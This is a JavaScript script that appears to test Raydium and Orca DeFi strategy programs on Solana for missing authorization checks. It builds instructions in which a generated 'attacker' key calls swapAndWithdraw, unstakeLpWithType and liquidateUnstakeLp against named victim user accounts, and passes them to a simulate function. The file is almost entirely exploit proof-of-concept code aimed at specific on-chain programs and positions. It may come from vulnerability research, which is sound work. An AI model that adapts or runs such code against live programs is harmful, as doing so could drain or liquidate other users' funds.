const { conn, disc, simulate, ix, PublicKey, Keypair } = require("./lib.js");
const fs = require("fs");
const ANA = __dirname;

const RAY_PROG = "2nAAsYdXF3eTQzaeUQS3fr4o782dDg8L28mX39Wr5j8N";
const ORCA_PROG = "DmzAmomATKpNp2rCBfYLS7CSwQqeQTsgRYJA1oSSAJaP";
const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const CLOCK = "SysvarC1ock11111111111111111111111111111111";
const FEEPAYER = "6M1rN486dffB6d7q35qdxHLuWUFF9QtbTjLnPtEyRyJd"; // exists on-chain; simulation only

const strategies = JSON.parse(fs.readFileSync(`${ANA}/strategies.json`, "utf8"));
const byKey = {};
for (const kind of ["raydium", "orca"]) for (const s of strategies[kind]) byKey[s.strategy] = s;

const RAY_VICTIM = {
  userInfo: "128bqpQo1PJpPRCTYoAYJShVdzsyaAocpAXugfiVeko",
  userMain: "7CyNmYZ14RBs9rXKiQmizgpNnPEg4bYsKiskCmJ78fWM",
  strategy: "34eXEXypQiwyQhMRAMbCEJSs16SVaN3C6wzPicEcBTH1",
};
const ORCA_VICTIM = {
  userInfo: "11DbUEcnNmkzij9f9WdwS8FuRkHDng7cNK7Rh1trxmA",
  userMain: "3R32C2Kophx4oTED1t5Kxrtvi6wxyyDhPDhbxe1Epqf3",
  strategy: "CcN9eP9wfUpbCncDBo4SvtDQkhcaqNcP8qdjtyAeDBNs",
};

function meta(pubkey, signer, writable) { return { pubkey, signer: !!signer, writable: !!writable }; }

(async () => {
  const attacker = Keypair.generate().publicKey.toBase58();
  console.log("attacker:", attacker, "feePayer:", FEEPAYER);

  // Test 1: raydium swapAndWithdraw, attacker caller + victim userInfo; placeholders after account 9
  {
    const s = byKey[RAY_VICTIM.strategy];
    const P = RAY_VICTIM.userInfo; // placeholder existing account
    const keys = [
      meta(attacker, true, true),
      meta(RAY_VICTIM.userInfo, false, true),
      meta(attacker, false, true), meta(attacker, false, true),
      meta(s.strategy, false, true), meta(s.authority, false, true),
      meta(s.tknAccount0, false, true), meta(s.tknAccount1, false, true), meta(s.lpAccount, false, true),
      meta(TOKEN, false, false), meta(s.ammProgramId, false, false),
      meta(s.ammId, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true),
      meta(P, false, true), meta(P, false, true),
      meta("9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin", false, false),
      meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true),
    ];
    for (const [label, d] of [["anchor-disc", Buffer.concat([disc("swapAndWithdraw"), Buffer.from([0])])], ["dappio-hex", Buffer.from("6f607d39534edca000", "hex")]]) {
      await simulate([ix(RAY_PROG, d, keys)], [RAY_VICTIM.userInfo, s.tknAccount0], `ray swapAndWithdraw attacker-caller (${label})`);
    }
  }

  // Test 2: raydium unstakeLpWithType, attacker signer + victim userInfo
  {
    const s = byKey[RAY_VICTIM.strategy];
    const P = RAY_VICTIM.userInfo;
    const data = Buffer.concat([disc("unstakeLpWithType"), Buffer.alloc(24)]);
    const keys = [
      meta(attacker, true, true), meta(RAY_VICTIM.userInfo, false, true),
      meta(s.strategy, false, true), meta(s.authority, false, true), meta(s.lpAccount, false, true),
      meta(s.rewardAccount, false, true), meta(s.rewardAccountB, false, true), meta(P, false, true),
      meta(s.stakeProgramId || P, false, false), meta(s.stakePoolId || P, false, true), meta(P, false, false),
      meta(P, false, true), meta(P, false, true), meta(P, false, true),
      meta(TOKEN, false, false), meta(CLOCK, false, false),
      meta(s.lendingPool0, false, true), meta(s.lendingPool1, false, true),
      meta(attacker, false, true), meta(P, false, true),
    ];
    await simulate([ix(RAY_PROG, data, keys)], [RAY_VICTIM.userInfo], "ray unstakeLpWithType attacker-signer");
  }

  // Test 3: orca unstakeLpWithType, attacker signer + victim userInfo
  {
    const s = byKey[ORCA_VICTIM.strategy];
    const P = ORCA_VICTIM.userInfo;
    const data = Buffer.concat([disc("unstakeLpWithType"), Buffer.alloc(24)]);
    const keys = [
      meta(attacker, true, true), meta(ORCA_VICTIM.userInfo, false, true),
      meta(s.strategy, false, true), meta(s.authority, false, true),
      meta(s.lpTknAccount, false, true), meta(s.farmTknAccount, false, true), meta(s.rewardsTknAccount, false, true),
      meta(s.strategyFarmInfo || P, false, true),
      meta(s.stakeProgramId || P, false, false),
      meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, true), meta(P, false, false),
      meta(TOKEN, false, false), meta(CLOCK, false, false),
      meta(s.lendingPool0, false, true), meta(s.lendingPool1, false, true),
      meta(attacker, false, true), meta(P, false, true),
    ];
    await simulate([ix(ORCA_PROG, data, keys)], [ORCA_VICTIM.userInfo], "orca unstakeLpWithType attacker-signer");
  }

  // Test 4: orca liquidateUnstakeLp, attacker liquidator on victim position
  {
    const s = byKey[ORCA_VICTIM.strategy];
    const P = ORCA_VICTIM.userInfo;
    const data = Buffer.concat([disc("liquidateUnstakeLp"), Buffer.from([0])]);
    const keys = [
      meta(attacker, true, true), meta(attacker, false, true),
      meta(ORCA_VICTIM.userInfo, false, true), meta(s.strategy, false, true), meta(s.authority, false, true),
      meta(s.lpTknAccount, false, true), meta(s.strategyFarmInfo || P, false, true), meta(s.ammId, false, true),
      meta(P, false, true), meta(P, false, true),
      meta(s.stakeProgramId || P, false, false),
      meta(P, false, true), meta(P, false, true), meta(s.farmTknAccount, false, true), meta(P, false, true),
      meta(P, false, true), meta(s.rewardsTknAccount, false, true), meta(P, false, false),
      meta(TOKEN, false, false), meta(CLOCK, false, false),
      meta(s.lendingPool0, false, true), meta(s.lendingPool1, false, true),
      meta(attacker, false, true), meta(s.rewardsTknAccount, false, true),
    ];
    await simulate([ix(ORCA_PROG, data, keys)], [ORCA_VICTIM.userInfo], "orca liquidateUnstakeLp attacker-liquidator");
  }

  // Test 5: sanity - bogus discriminator
  await simulate([ix(ORCA_PROG, Buffer.concat([disc("doesNotExist123"), Buffer.alloc(8)]), [meta(attacker, true, true)])], [], "orca bogus discriminator (sanity)");
})().catch(e => { console.error("FATAL", e); process.exit(1); });
